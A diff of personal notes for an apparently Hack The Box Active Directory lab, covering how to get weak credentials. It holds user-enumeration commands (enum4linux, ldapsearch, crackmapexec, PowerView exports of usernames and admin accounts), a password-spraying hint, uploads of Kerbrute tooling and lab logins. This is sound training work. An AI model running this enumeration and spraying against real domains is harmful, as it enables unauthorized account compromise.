@@ -76,37 +76,43 @@ NMAP Scan for 172.16.7.60 shows it's name as `SQL01`
 
 #### Question 4: Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
 
-
-Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executablecd ..
-
-```go
-scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.15.101:~/Desktop/HTB
-```
-
->[!Warning] "$DISPLAY environment variable not properly set" error message
-> I got the above error message when attempting to RDP into the MS01 host. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags
-
-password
 ```go
 HTB_@cademy_stdnt!
 ```
 
 ```go
-xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HTB,/home/htb-student/Desktop/HTB /smart-sizing:2400x1200 /cert:ignore
+ssh -X htb-student@10.129.16.227
+```
+
+
+Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executable ..
+
+```go
+scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.16.227:~/Desktop/HTB
+```
+
+>[!Warning] "$DISPLAY environment variable not properly set" error message
+> I got the above error message when attempting to RDP into the MS01 host. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags
+
+```go
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200
+```
+
+>[!Info] Try any of these and pair it with the password spraying technique
+
+Export to username list
+```go
+Get-NetUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\userlist.txt
 ```
 
 ```go
-enum4linux -U 172.16.7.50 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+Get-DomainUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\ad_users.txt -NoTypeInformation
 ```
 
+Export admin to admin_users.txt
 ```go
-ldapsearch -h 172.16.7.50 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
+Get-NetUser | Where-Object { $_.samaccountname -like "*admin*" } |
+    Select-Object -ExpandProperty samaccountname |
+    Out-File .\admin_users.txt
 ```
 
-```go
-./windapsearch.py --dc-ip 172.16.7.50 -u "" -U
-```
-
-```go
-sudo crackmapexec smb 172.16.7.50 -u htb-student -p HTB_@cademy_stdnt! --users
-```
